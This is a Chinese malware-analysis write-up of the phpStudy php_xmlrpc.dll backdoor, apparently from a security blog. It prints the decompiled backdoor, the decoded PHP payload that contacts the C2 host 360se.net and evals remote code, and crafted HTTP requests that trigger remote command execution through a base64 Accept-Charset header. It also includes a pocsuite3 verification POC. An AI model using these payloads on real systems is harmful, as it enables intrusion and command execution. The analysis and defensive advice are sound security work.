@@ -1,0 +1,374 @@
+原创： Qftm 合天智汇
+
+原创投稿活动：[重金悬赏 |
+合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)
+
+关于《PhpStudyBackDoor》风波已经过去有一段时间了，由于，前段时间一直忙于其它事情QAQ，今天有时间对该事件重新回溯&深度分析。
+
+*严正声明：本文仅限于技术讨论与分享，严禁用于非法途径
+
+背景分析
+
+2019年9月20日，杭州市公安局举行新闻通报会，通报今年以来组织开展打击涉网违法犯罪暨“净网2019”专项行动战果，通报内容中提到国内著名的PHP调试环境程序集成包Phpstudy软件遭受到以马某为首的国内黑客团伙攻击并被植入后门。Phpstudy集成环境包在国内的使用用户逾百万，据悉，此次后门攻击事件可追溯到2016年，屹今为止累计控制计算机逾67万台，该黑客团伙通过该后门获取的用户信息、各类系统账号信息进一步开展违法行为，累计非法牟利600余万元。
+
+影响版本
+
+phpStudy20180211版本php5.4.45与php5.2.17ext扩展文件夹下的php_xmlrpc.dll
+
+phpStudy20161103版本php5.4.45与php5.2.17ext扩展文件夹下的php_xmlrpc.dll
+
+环境准备
+
+测试环境以“phpStudy20161103版本php5.4.45”为例进行分析
+
+ps:目前官方已更新旧版本程序，可自行下载https://www.xp.cn
+
+![v2-281b3bbb804fefe682e28929a2fb52b6_hd.j](https://pic3.zhimg.com/80/v2-281b3bbb804fefe682e28929a2fb52b6_hd.jpg)
+
+第一个是目前官方正常配置文件，第二个是被植入后门的配置文件，从图中直观的也能看出来两个文件的大小不一样！！分别对其进行Hash校验：
+
+![v2-8f6fef7a576b95045344f3256a676e1d_hd.j](https://pic1.zhimg.com/80/v2-8f6fef7a576b95045344f3256a676e1d_hd.jpg)
+
+MD5(php_xmlrpc.dll)：c339482fd2b233fb0a555b629c0ea5d5
+
+MD5(php_xmlrpctrue.dll)：6ddb8f2af4b2b24671ddcd82d7c08c91
+
+通过Hash校验发现两个文件的Hash值不一样！
+
+实验：phpStudy后门漏洞复现[实验:phpStudy后门漏洞复现(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECID1387-c383-454e-9448-6460e0f4581f)
+
+后门分析
+
+目前各大厂商已将此后门加入威胁情报库中，此处通过virustotal和火绒查看
+
+![v2-20c8842dd8113ee9bc38489d507e628c_hd.j](https://pic4.zhimg.com/80/v2-20c8842dd8113ee9bc38489d507e628c_hd.jpg)
+
+![v2-aeab7c7b1d6f26ae601ba5497840c320_hd.j](https://pic2.zhimg.com/80/v2-aeab7c7b1d6f26ae601ba5497840c320_hd.jpg)
+
+从上图可以看到原始的php_xmlrpc.dll存在威胁，接下来开始对“php_xmlrpc.dll”进行深入分析......
+
+通过IDA进行查看可以发现官方更新过的“php_xmlrpc.dll”文件已经不存在危险函数“sub_100031F0”，下面正式分析被植入后门的“php_xmlrpc.dll”
+
+首先，用IDA打开“php_xmlrpc.dll”，shift+f12定位是否存在危险字符串
+
+![v2-cfbcaf7056a171a178916ddd18df7b57_hd.j](https://pic3.zhimg.com/80/v2-cfbcaf7056a171a178916ddd18df7b57_hd.jpg)
+
+通过索引发现存在危险函数eval()
+
+![v2-accb9e354ae0b8d94af0e2f3fad76331_hd.j](https://pic4.zhimg.com/80/v2-accb9e354ae0b8d94af0e2f3fad76331_hd.jpg)
+
+根据eval()函数定位到相应的代码段然后反编译伪代码找到后门危险函数“sub_100031F0”
+
+![v2-db87f68ff1287f4c96bdf61373dc0549_hd.j](https://pic1.zhimg.com/80/v2-db87f68ff1287f4c96bdf61373dc0549_hd.jpg)
+
+![v2-296dca819fcf9f13997921b4ad52759d_hd.j](https://pic4.zhimg.com/80/v2-296dca819fcf9f13997921b4ad52759d_hd.jpg)
+
+“sub_100031F0”程序代码
+
+{ int v3; // edx int v4; // eax int v5; // ecx int v6; // eax int v7; // esi
+char *v8; // edi char *v9; // ecx int v10; // eax char *v11; // esi int v12;
+// eax char *v13; // edi char *v14; // ecx _DWORD *v15; // esi int v16; // eax
+void *v17; // edx int v18; // eax void *v19; // edi _DWORD *v20; // esi int
+result; // eax int v22; // eax int v23; // ecx int v24; // eax int v25; // edi
+_DWORD *v26; // esi char v27; // [esp+Dh] [ebp-19Bh] __int16 v28; // [esp+BDh]
+[ebp-EBh] char v29; // [esp+BFh] [ebp-E9h] char v30; // [esp+C0h] [ebp-E8h]
+char v31; // [esp+100h] [ebp-A8h] char v32; // [esp+140h] [ebp-68h] char v33;
+// [esp+180h] [ebp-28h] const char ***v34; // [esp+184h] [ebp-24h] int v35; //
+[esp+188h] [ebp-20h] int v36; // [esp+18Ch] [ebp-1Ch] int **v37; // [esp+190h]
+[ebp-18h] int v38; // [esp+194h] [ebp-14h] _DWORD **v39; // [esp+198h]
+[ebp-10h] void *v40; // [esp+19Ch] [ebp-Ch] char *v41; // [esp+1A0h] [ebp-8h]
+char *v42; // [esp+1A4h] [ebp-4h] memset(&v27, 0, 0xB0u); v28 = 0; v3 = *a3;
+v29 = 0; if ( *(_BYTE *)(*(_DWORD *)(v3 + 4 * core_globals_id - 4) + 210) )
+zend_is_auto_global(aServer, 7, a3); zend_hash_find(*(_DWORD *)(*a3 + 4 *
+executor_globals_id - 4) + 216, aServer, 8, &v33); if (
+zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer,
+strlen(aServer) + 1, &v39) != -1 && zend_hash_find(**v39, aHttpAcceptEnco,
+strlen(aHttpAcceptEnco) + 1, &v34) != -1 ) { if ( !strcmp(**v34, aGzipDeflate)
+) { if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216,
+aServer, strlen(aServer) + 1, &v39) != -1 && zend_hash_find(**v39,
+aHttpAcceptChar, strlen(aHttpAcceptChar) + 1, &v37) != -1 ) { v40 =
+sub_100040B0(**v37, strlen((const char *)**v37)); if ( v40 ) { v4 = *(_DWORD
+*)(*a3 + 4 * executor_globals_id - 4); v5 = *(_DWORD *)(v4 + 296); *(_DWORD
+*)(v4 + 296) = &ampv30 v35 = v5; v6 = setjmp3(&v30, 0); v7 = v35; if ( v6 )
+*(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v35; else
+zend_eval_string(v40, 0, &byte_10012884, a3); *(_DWORD *)(*(_DWORD *)(*a3 + 4
+* executor_globals_id - 4) + 296) = v7; } } } else { v12 = strcmp(**v34,
+aCompressGzip); if ( !v12 ) { v13 = &byte_10012884; v14 = (char
+*)&unk_1000D66C; v42 = &byte_10012884; v15 = &unk_1000D66C; while ( 1 ) { if (
+*v15 == 39 ) { v13[v12] = 92; v42[v12 + 1] = *v14; v12 += 2; v15 += 2; } else
+{ v13[v12++] = *v14; ++v15; } v14 += 4; if ( (signed int)v14 >= (signed
+int)&unk_1000E5** ) break; v13 = v42; } spprintf(&v36, 0, aVSMS,
+byte_100127B8, Dest); spprintf(&v42, 0, aSEvalSS, v36, aGzuncompress, v42);
+v16 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4); v17 = *(void **)(v16 +
+296); *(_DWORD *)(v16 + 296) = &ampv32 v40 = v17; v18 = setjmp3(&v32, 0); v19
+= v40; if ( v18 ) { v20 = a3; *(_DWORD *)(*(_DWORD *)(*a3 + 4 *
+executor_globals_id - 4) + 296) = v40; } else { v20 = a3;
+zend_eval_string(v42, 0, &byte_10012884, a3); } result = 0; *(_DWORD
+*)(*(_DWORD *)(*v20 + 4 * executor_globals_id - 4) + 296) = v19; return
+result; } } } if ( dword_10012AB0 - dword_10012AA0 >= dword_1000D010 &&
+dword_10012AB0 - dword_10012AA0 < 6000 ) { if ( strlen(byte_100127B8) == 0 )
+sub_10004480(byte_100127B8); if ( strlen(Dest) == 0 ) sub_10004380(Dest); if (
+strlen(byte_100127EC) == 0 ) sub_100044E0(byte_100127EC); v8 = &byte_10012884;
+v9 = asc_1000D028; v41 = &byte_10012884; v10 = 0; v11 = asc_1000D028; while (
+1 ) { if ( *(_DWORD *)v11 == 39 ) { v8[v10] = 92; v41[v10 + 1] = *v9; v10 +=
+2; v11 += 8; } else { v8[v10++] = *v9; v11 += 4; } v9 += 4; if ( (signed
+int)v9 >= (signed int)&unk_1000D66C ) break; v8 = v41; } spprintf(&v41, 0,
+aEvalSS, aGzuncompress, v41); v22 = *(_DWORD *)(*a3 + 4 * executor_globals_id
+- 4); v23 = *(_DWORD *)(v22 + 296); *(_DWORD *)(v22 + 296) = &ampv31 v38 =
+v23; v24 = setjmp3(&v31, 0); v25 = v38; if ( v24 ) { v26 = a3; *(_DWORD
+*)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v38; } else { v26 =
+a3; zend_eval_string(v41, 0, &byte_10012884, a3); } *(_DWORD *)(*(_DWORD
+*)(*v26 + 4 * executor_globals_id - 4) + 296) = v25; if ( dword_1000D010 <
+3600 ) dword_1000D010 += 3600; ftime(&dword_10012AA0); }
+ftime(&dword_10012AB0); if ( dword_10012AA0 < 0 ) ftime(&dword_10012AA0);
+return 0;}
+
+首先分析spprintf()函数代码处功能，因为其对eval()函数进行了处理
+
+spprintf(&v42, 0, aSEvalSS, v36, aGzuncompress, v42);spprintf(&v41, 0,
+aEvalSS, aGzuncompress, v41);
+
+spprintf函数是php官方自己封装的函数，此处实际上实现的是字符串拼接功能，实际代码如下：
+
+@eval(%s(',27h,'%s',27h,'));@eval(gzuncompress(',27h,’v42′,27h,'));
+@eval(gzuncompress(',27h,’v41′,27h,'));
+
+ps:eval()函数中第一个%s位格式化字符串、第二个%s为字符串传参
+
+可以看到上述代码主要对v41、v42数据进行解压执行操控，可以初步猜想恶意代码存在于v41和v42数据中，同理按照思路流程向上去找v41、v42数据内容，
+
+对v41的处理代码
+
+if ( strlen(byte_100127EC) == 0 ) sub_100044E0(byte_100127EC); v8 =
+&byte_10012884; v9 = asc_1000D028; v41 = &byte_10012884; v10 = 0; v11 =
+asc_1000D028; while ( 1 ) { if ( *(_DWORD *)v11 == 39 ) { v8[v10] = 92;
+v41[v10 + 1] = *v9; v10 += 2; v11 += 8; } else { v8[v10++] = *v9; v11 += 4; }
+v9 += 4; if ( (signed int)v9 >= (signed int)&unk_1000D66C ) break; v8 = v41; }
+
+对v42的处理代码
+
+if ( !v12 ) { v13 = &byte_10012884; v14 = (char *)&unk_1000D66C; v42 =
+&byte_10012884; v15 = &unk_1000D66C; while ( 1 ) { if ( *v15 == 39 ) {
+v13[v12] = 92; v42[v12 + 1] = *v14; v12 += 2; v15 += 2; } else { v13[v12++] =
+*v14; ++v15; } v14 += 4; if ( (signed int)v14 >= (signed int)&unk_1000E5** )
+break; v13 = v42; }
+
+分析代码可知v41数据内容是1000D028-1000D66C(基地址为10000000)范围内的数据，v42数据内容是1000D66C-1000E5**(基地址为10000000)范围内的数据，使用010edit查看发现其均位于.data数据块
+
+![v2-fcf32c5f70b3805a890160f526e2881d_hd.j](https://pic3.zhimg.com/80/v2-fcf32c5f70b3805a890160f526e2881d_hd.jpg)
+
+![v2-bd5b43391bbd7327d653bc28bd0c1e7a_hd.j](https://pic1.zhimg.com/80/v2-bd5b43391bbd7327d653bc28bd0c1e7a_hd.jpg)
+
+由于.data为dword类型每个值占用4个字节，代码处将其转换为char类型进行存储，然后使用php内置函数gzuncompress对其解压执行
+
+使用微步情报局公开的解密脚本进行两段数据的提取解压
+
+# -*- coding:utf-8 -*- # !/usr/bin/env python import os, sys, string, shutil,
+re import base64 import struct import pefile import ctypes import zlib #
+import put_family_c2 def hexdump(src, length=16): FILTER =
+''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
+lines = [] for c in xrange(0, len(src), length): chars = src[c:c + length] hex
+= ' '.join(["%02x" % ord(x) for x in chars]) printable = ''.join(["%s" %
+((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
+lines.append("%04x %-*s %s\n" % (c, length * 3, hex, printable)) return
+''.join(lines) def descrypt(data): try: # data = base64.encodestring(data) #
+print(hexdump(data)) num = 0 data = zlib.decompress(data) # return result
+return (True, result) except Exception, e: print(e) return (False, "") def
+GetSectionData(pe, Section): try: ep = Section.VirtualAddress ep_ava =
+Section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase data =
+pe.get_memory_mapped_image()[ep:ep + Section.Misc_VirtualSize] #
+print(hexdump(data)) return data except Exception, e: return None def
+GetSecsions(PE): try: for section in PE.sections: #
+print(hexdump(section.Name)) if (section.Name.replace('\x00', '') == '.data'):
+data = GetSectionData(PE, section) # print(hexdump(data)) return (True, data)
+return (False, "") except Exception, e: return (False, "") def
+get_encodedata(filename): pe = pefile.PE(filename) (ret, data) =
+GetSecsions(pe) if ret: flag = "gzuncompress" offset = data.find(flag) data =
+data[offset + 0x10:offset + 0x10 + 0x567 * 4].replace("\x00\x00\x00", "")
+decodedata_1 = zlib.decompress(data[:0x191]) print(hexdump(data[0x191:]))
+decodedata_2 = zlib.decompress(data[0x191:]) with open("decode_1.txt", "w") as
+hwrite: hwrite.write(decodedata_1) hwrite.close with open("decode_2.txt", "w")
+as hwrite: hwrite.write(decodedata_2) hwrite.close def main(path): c2s = []
+domains = [] file_list = os.listdir(path) for f in file_list: print f
+file_path = os.path.join(path, f) get_encodedata(file_path) if __name__ ==
+"__main__": # os.getcwd() path = "php5.4.45" main(path)
+
+运行结果生成两个数据文件分别对应v41、v42，查看数据内容是经过base64编码过的，对其解码
+
+v41数据
+
+@ini_set("display_errors","0"); error_reporting(0); $h =
+$_SERVER['HTTP_HOST']; $p = $_SERVER['SERVER_PORT']; $fp = fsockopen($h, $p,
+$errno, $errstr, 5); if (!$fp) { } else { $out = "GET
+{$_SERVER['SCRIPT_NAME']} HTTP/1.1\r\n"; $out .= "Host: {$h}\r\n"; $out .=
+"Accept-Encoding: compress,gzip\r\n"; $out .= "Connection: Close\r\n\r\n";
+fwrite($fp, $out); fclose($fp); }
+
+v41脚本：使用fsockopen模拟GET发包
+
+v42数据
+
+@ini_set("display_errors","0"); error_reporting(0); function tcpGet($sendMsg =
+'', $ip = '360se.net', $port = '20123'){ $result = ""; $handle =
+stream_socket_client("tcp://{$ip}:{$port}", $errno, $errstr,10); if( !$handle
+){ $handle = fsockopen($ip, intval($port), $errno, $errstr, 5); if( !$handle
+){ return "err"; } } fwrite($handle, $sendMsg."\n"); while(!feof($handle)){
+stream_set_timeout($handle, 2); $result .= fread($handle, 1024); $info =
+stream_get_meta_data($handle); if ($info['timed_out']) { break; } }
+fclose($handle); return $result; } $ds =
+array("www","bbs","cms","down","up","file","ftp"); $ps =
+array("20123","40125","8080","80","53"); $n = false; do { $n = false; foreach
+($ds as $d){ $b = false; foreach ($ps as $p){ $result =
+tcpGet($i,$d.".360se.net",$p); if ($result != "err"){ $b =true; break; } } if
+($b)break; } $info = explode("<^>",$result); if (count($info)==4){ if
+(strpos($info[3],"/*Onemore*/") !== false){ $info[3] =
+str_replace("/*Onemore*/","",$info[3]); $n=true; }
+@eval(base64_decode($info[3])); } }while($n);
+
+v42脚本：后门c2服务器(360se.net)(当前c2已经失活，因此不会对相关被控主机造成新的危害)ps:从上面v41、v42数据的提取过程，可以发现攻击者对数据进行了压缩存储，增加了恶意代码的隐蔽性，同时c2服务器域名模仿了奇虎360公司相关产品名称，具有一定的欺诈特性。
+
+实验：phpStudy后门漏洞复现
+
+[实验:phpStudy后门漏洞复现(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECID1387-c383-454e-9448-6460e0f4581f)
+
+分析反向连接c2后门
+
+核心代码
+
+v12 = strcmp(**v34, aCompressGzip); // //compress,gzip if ( !v12 ) { v13 =
+&byte_10012884; v14 = (char *)&unk_1000D66C; v42 = &byte_10012884; v15 =
+&unk_1000D66C; while ( 1 ) { if ( *v15 == 39 ) { v13[v12] = 92; v42[v12 + 1] =
+*v14; v12 += 2; v15 += 2; } else { v13[v12++] = *v14; ++v15; } v14 += 4; if (
+(signed int)v14 >= (signed int)&unk_1000E5** ) break; v13 = v42; }
+spprintf(&v36, 0, aVSMS, byte_100127B8, Dest); spprintf(&v42, 0, aSEvalSS,
+v36, aGzuncompress, v42); v16 = *(_DWORD *)(*a3 + 4 * executor_globals_id -4); v17 = *(void **)(v16 + 296);
+
+分析代码逻辑，首先想要执行
+
+spprintf(&v42, 0, aSEvalSS, v36, aGzuncompress, v42);
+
+必须满足if( !v12 )
+
+v12 = strcmp(**v34, aCompressGzip);if ( !v12 )
+
+![v2-46163c3851ad80908210f08d46cecda5_hd.j](https://pic1.zhimg.com/80/v2-46163c3851ad80908210f08d46cecda5_hd.jpg)
+
+定位aCompressGzip，只要ACCEPT_ENCODING等于compress,gzip即可出发v42恶意代码
+
+构造相应Payload：
+
+GET / HTTP/1.1Host: x.x.x.x…..Accept-Encoding:compress,gzip….
+
+ps:由于C2服务器已经失效，不在进行后续操作
+
+分析正向连接RCE
+
+在C2后门基础上向上接着分析
+
+核心代码
+
+if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216,
+aServer, strlen(aServer) + 1, &v39) != -1 && zend_hash_find(**v39,
+aHttpAcceptEnco, strlen(aHttpAcceptEnco) + 1, &v34) != -1 ) { if (
+!strcmp(**v34, aGzipDeflate) ) { if ( zend_hash_find(*(_DWORD *)(*a3 + 4 *
+executor_globals_id - 4) + 216, aServer, strlen(aServer) + 1, &v39) != -1 &&
+zend_hash_find(**v39, aHttpAcceptChar, strlen(aHttpAcceptChar) + 1, &v37) !=
+-1 ) { v40 = sub_100040B0(**v37, strlen((const char *)**v37)); if ( v40 ) { v4
+= *(_DWORD *)(*a3 + 4 * executor_globals_id - 4); v5 = *(_DWORD *)(v4 + 296);
+*(_DWORD *)(v4 + 296) = &ampv30 v35 = v5; v6 = setjmp3(&v30, 0); v7 = v35; if
+( v6 ) *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) =
+v35; else zend_eval_string(v40, 0, &byte_10012884, a3); *(_DWORD *)(*(_DWORD
+*)(*a3 + 4 * executor_globals_id - 4) + 296) = v7; } } }
+
+分析代码逻辑
+
+第一个if()，判断是否存在HTTP_ACCEPT_ENCODING字段，$_SERVER['HTTP_ACCEPT_ENCODING']
+为当前请求的Accept-Encoding:头部信息的内容。
+
+第二个if()，在第一个if()基础上，判断$_SERVER['HTTP_ACCEPT_ENCODING']字段值是否是gzip,deflate。
+
+第三个if()，在前两个if()的基础上，判断是否存在HTTP_ACCEPT_CHARSET字段，$_SERVER['HTTP_ACCEPT_CHARSET']为当前请求的Accept-Charset:头部信息的内容。
+
+最后，在前三个if()的基础上，提取HTTP_ACCEPT_CHARSET字段值，并对该值进行base64解码，然后调用zend_eval_string(v40,0,
+&byte_10012884, a3); 执行RCE。
+
+构造相应Payload：
+
+GET / HTTP/1.1Host: x.x.x.x…..Accept-Encoding: gzip,deflateAccept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==….
+
+EXP利用
+
+后门RCE
+
+exp构造
+
+GET /phpinfo.php HTTP/1.1Host: 192.168.43.146User-Agent: Mozilla/5.0 (Windows
+NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip,deflateAccept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==Connection:
+closeUpgrade-Insecure-Requests: 1
+
+exp利用
+
+![v2-d3484d0ef14721ff034ea69ce6cc1374_hd.j](https://pic3.zhimg.com/80/v2-d3484d0ef14721ff034ea69ce6cc1374_hd.jpg)
+
+Accept-Charset请求头字段值需要经过base64编码
+
+c3lzdGVtKCJuZXQgdXNlciIpOw== system("net user");
+
+POC构造
+
+后门RCE
+
+POC验证
+
+POC代码编写利用创宇的pocsuite3框架进行编写，此处放上自己最初写的POC，只包含漏洞验证模块，因为本人已删掉attack模块（安全第一！！！）
+
+import base64import hashlibimport randomimport urllibfrom urllib.parse import
+urljoin, quotefrom pocsuite3.api import Output, POCBase, POC_CATEGORY,
+register_poc, get_listener_ip, get_listener_portfrom pocsuite3.api import
+requestsfrom pocsuite3.lib.core.data import loggerfrom pocsuite3.lib.utils
+import get_middle_text class DemoPOC(POCBase): vulID = '93212' # ssvid version
+= '1.0' author = ['Qftm'] vulDate = '2019-09-23' createDate = '2019-09-23'
+updateDate = '2019-09-23' references =
+['https://www.seebug.org/vuldb/ssvid-93212'] name = 'phpstudy backdoor'
+appPowerLink = 'http://www.finecms.net/show-1.html ' appName = 'phpstudy'
+appVersion = 'version = 2018|2016' vulType = 'backdoor' desc = '''Phpstudy
+Backdoor RCE''' samples = [] install_requires = [''] category =
+POC_CATEGORY.EXPLOITS.WEBAPP def _verify(self): result = {} try: vul_url =
+urljoin(self.url, '/') rand_num = random.randint(0, 1000) hash_flag =
+hashlib.md5(str(rand_num).encode()).hexdigest() print(vul_url) prexp = '''echo
+'{}' ;'''.format(hash_flag) exp = base64.b64encode(prexp.encode()).decode()
+headers = {'Accept-Encoding': 'gzip,deflate', 'Accept-Charset':
+'{}'.format(exp) } r = requests.post(vul_url, headers=headers) if
+r.status_code != 404: if hash_flag in r.text: print(r.headers.get("Location"))
+result['VerifyInfo'] = {} result['VerifyInfo']['URL'] = self.url except
+Exception as ex: logger.exception(ex) return self.parse_output(result) def
+_attack(self): result = {} return self.parse_output(result) def
+parse_output(self, result): output = Output(self) if result:
+output.success(result) else: output.fail('target is not vulnerable') return
+output register_poc(DemoPOC)
+
+漏洞验证机制使用随机数产生的MD5值（hash_flag）进行校验，首先判断网页是否是404提高命中率，然后根据网页返回来的内容，比对查看是否包含相应的hash_flag，如果包含则证明存在后门RCE，否则不存在。
+
+验证效果
+
+![v2-229035785a5bf9a11b0375109c0e1155_hd.j](https://pic1.zhimg.com/80/v2-229035785a5bf9a11b0375109c0e1155_hd.jpg)
+
+漏洞预防
+
+1、内部排查确认受影响的Phpstudy环境PC主机，进行安全扫描处理（火绒、360安全卫士等）、清除可能存在的可疑程序。
+
+2、对受影响的Phpstudy环境PC主机上的用户账号信息做登录日志审计、及时更换相关账号密码，防止账号密码早已泄露，造成危害。
+
+3、到官网进行下载更新，校验hash。
+
+参考链接
+
+https://mp.weixin.qq.com/s/CqHrDFcubyn_y5NTfYvkQw
+https://www.freebuf.com/articles/others-articles/215406.html#
+https://mp.weixin.qq.com/s?__biz=MzI5NjA0NjI5MQ==∣=2650165920&idx=1&sn=ac45922b6cf1db0f3d3cf0a1
+
+声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！
+
+  
+
